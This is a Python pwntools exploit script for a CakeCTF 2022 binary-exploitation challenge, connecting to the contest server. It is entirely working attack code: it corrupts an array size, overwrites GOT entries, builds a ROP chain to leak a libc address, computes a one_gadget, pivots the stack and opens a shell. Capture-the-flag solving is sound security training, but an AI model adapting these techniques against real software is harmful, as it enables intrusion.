#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chall"
libc = ELF("./libc-2.31.so")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("pwn1.2022.cakectf.com", 9002)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		#b *main+243
        #b *main+311
        #b *0x4012cd
        #b *0x40132a
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

def edit(idx, val):
    p.recvuntil("index:")
    p.sendline(str(int(idx)))
    p.recvuntil("value:")
    p.sendline(str(int(val)))


size = 5
p.recvuntil("size:")
p.sendline(str(size))
edit(0, 0x4013e3)# pop rdi; ret
edit(1, 0x404050)# stdout@bss
edit(2, 0x401090)# printf@plt
edit(3, 0x4010d0)# _start
#overwrite size
edit(4, 0xffffffff)
# index=6 == ptr of index 0
edit(6, 0x404018)# setvbuf@got
edit(0, 0x401090)# printf@plt
edit(4, 0x4013e2)# exit@got -> pop r15; ret
# exec rop chain
p.recvuntil("index:")
p.sendline("-1")
p.recvuntil(b'\x20')
stdout_libc_addr = u64(p.recv(6).ljust(8, b"\x00"))
log.info("leak: " + hex(stdout_libc_addr))
libc_base = stdout_libc_addr - libc.symbols['_IO_2_1_stdout_']
log.info("libc base: " + hex(libc_base))
one_gadget = libc_base + 0xe3afe# r12 & r15 == NULL
log.info("one gadget: " + hex(one_gadget))

p.sendline(str(size))
edit(0, 0x4013dd)# pop rsp; pop r13; pop r14; pop r15; ret
edit(1, 0x404070)
#overwrite size again
edit(4, 0xffffffff)
edit(6, 0x404070)# bss
edit(0, 0xdeadbeef)
edit(1, 0xdeadbeef)
edit(2, 0xdeadbeef)
edit(3, 0x4013dc)# pop r12; pop r13; pop r14; pop r15; ret
edit(4, 0)
edit(5, 0xdeadbeef)
edit(6, 0xdeadbeef)
edit(7, 0)
edit(8, one_gadget)
p.recvuntil("index:")
p.sendline("-1")
log.info("stack pivot: RSP -> " + hex(0x404070))

p.interactive()
